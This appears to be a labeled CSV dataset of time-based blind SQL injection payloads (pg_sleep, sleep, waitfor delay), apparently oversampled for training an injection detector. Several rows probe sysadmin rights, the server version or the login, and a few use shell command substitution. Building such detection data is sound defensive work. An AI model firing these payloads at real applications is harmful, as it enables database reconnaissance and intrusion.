id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001822,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.430408864233821
SMOTE_001823,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.17846596747727822
SMOTE_001824,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.2933132854245495
SMOTE_001825,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.539459634308561
SMOTE_001826,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.3016090250300595
SMOTE_001827,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.9545794557950686
SMOTE_001828,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.9088554657708733
SMOTE_001829,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.3620923365760957
SMOTE_001830,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,2.4638779500662427
SMOTE_001831,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.2912044904843412
SMOTE_001832,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.0067613086170355
SMOTE_001833,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,3.0449154741939197
SMOTE_001834,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.4623245199457988
SMOTE_001835,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.9473892537629103
SMOTE_001836,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.4861588311173503
SMOTE_001837,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.030125943441735
SMOTE_001838,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.8246493356429218
SMOTE_001839,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.2259826621977055
SMOTE_001840,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.15779992606166465
SMOTE_001841,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.5386277753637531
SMOTE_001842,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.4286339168776932
SMOTE_001843,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.6784571885672483
SMOTE_001844,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.2664991125900193
SMOTE_001845,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.3217105857832454
SMOTE_001846,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.2405726962123436
SMOTE_001847,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.19874553653536456
SMOTE_001848,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.092904820980164
SMOTE_001849,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,2.941826948373828
SMOTE_001850,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.4690160347553405
SMOTE_001851,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.17807721393935116
SMOTE_001852,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.001631216185484495
SMOTE_001853,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.3930984636295556
SMOTE_001854,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.0035248639080346657
SMOTE_001855,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.0296960549831078
SMOTE_001856,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.7014808999411892
SMOTE_001857,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.6096894743593365
SMOTE_001858,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.5670633962895537
SMOTE_001859,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.25167199636482224
SMOTE_001860,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.750690018692986
SMOTE_001861,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.3318162039072132
SMOTE_001862,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.04273159117094344
SMOTE_001863,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.2293441898850668
SMOTE_001864,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.5975303129087288
SMOTE_001865,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.3842136998316766
SMOTE_001866,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.7643518738013948
SMOTE_001867,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.3503837309551372
SMOTE_001868,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.7386779510924733
SMOTE_001869,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.25864997065815104
SMOTE_001870,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.5850262110091995
SMOTE_001871,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.5501911559062556
SMOTE_001872,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.3115833579976744
SMOTE_001873,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.3583001548460191
SMOTE_001874,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.12211208639107422
SMOTE_001875,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.29125223010672013
SMOTE_001876,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.9220902691511615
SMOTE_001877,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.3940373233569883
SMOTE_001878,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.6979241906096422
SMOTE_001879,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.1100923680743044
SMOTE_001880,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,1.1398544003379993
SMOTE_001881,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.7714616005974686
SMOTE_001882,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.6905897015650118
SMOTE_001883,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.7397189317433401
SMOTE_001884,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.49058512116197744
SMOTE_001885,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.4906384328821807
SMOTE_001886,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.9434060135786808
SMOTE_001887,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.6439527892410981
SMOTE_001888,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.48470972726145295
SMOTE_001889,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.8300039145133837
SMOTE_001890,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.7540012910033111
SMOTE_001891,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.3854180310877122
SMOTE_001892,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.17751109327371878
SMOTE_001893,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.44746973944032414
SMOTE_001894,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.6477686862735411
SMOTE_001895,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.5764032449213677
SMOTE_001896,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.925155225587401
SMOTE_001897,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.52545270967091
SMOTE_001898,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.640932645365316
SMOTE_001899,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.7285968571608489
SMOTE_001900,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.8601585909044018
SMOTE_001901,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,2.2495506997795935
SMOTE_001902,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.5729882529808322
SMOTE_001903,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.23074185573490383
SMOTE_001904,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.4187559531089913
SMOTE_001905,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,2.1310628983038753
SMOTE_001906,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.4887905202513887
SMOTE_001907,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.10915449480448085
SMOTE_001908,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.7552489166823233
SMOTE_001909,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.462051920744901
SMOTE_001910,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.5315122191740381
SMOTE_001911,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.0424385215591489
SMOTE_001912,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.09577224052581626
SMOTE_001913,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,2.2123853475692576
SMOTE_001914,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_001915,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.6613354887304622
SMOTE_001916,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.42252522907867457
SMOTE_001917,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.8121769603370799
SMOTE_001918,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,2.5231130126465784
SMOTE_001919,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.4686972050937455
SMOTE_001920,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.4869791360197633
SMOTE_001921,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.7221712563282391
SMOTE_001922,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.7313860182642108
SMOTE_001923,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.6267464675772366
SMOTE_001924,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.268287152314418
SMOTE_001925,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.8852776127442832
SMOTE_001926,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.4898918294253645
SMOTE_001927,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.1669054978144424
SMOTE_001928,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.198248120006074
SMOTE_001929,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,4.331848349190444
SMOTE_001930,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.1661067797701594
SMOTE_001931,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.2491495306166498
SMOTE_001932,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.6142595873493548
SMOTE_001933,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,2.574058402987022
SMOTE_001934,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.5307355493622582
SMOTE_001935,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.8328172135938021
SMOTE_001936,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.6759684927120825
SMOTE_001937,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_001938,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.0910309187841398
SMOTE_001939,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.369603887803243
SMOTE_001940,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.241698512598804
SMOTE_001941,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.6512467063278455
SMOTE_001942,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.08221161432571075
SMOTE_001943,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_001944,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.13944356961393678
SMOTE_001945,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.7447051491095698
SMOTE_001946,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.3126518918171307
SMOTE_001947,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.46737316642154036
SMOTE_001948,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.2771146563557104
SMOTE_001949,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.1847974053980395
SMOTE_001950,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.2001485902095044
SMOTE_001951,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,3.4904487995738847
SMOTE_001952,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.21434377184538722
SMOTE_001953,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.3212494041512652
SMOTE_001954,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.4780841766337627
SMOTE_001955,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.548458805984638
SMOTE_001956,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.6498715328249028
SMOTE_001957,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.4435250614574522
SMOTE_001958,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.6055586562728625
SMOTE_001959,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.8903171523549379
SMOTE_001960,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.5732624410034697
SMOTE_001961,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.7445990570561486
SMOTE_001962,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.6751942854352847
SMOTE_001963,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.2340303955861005
SMOTE_001964,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.452358435560794
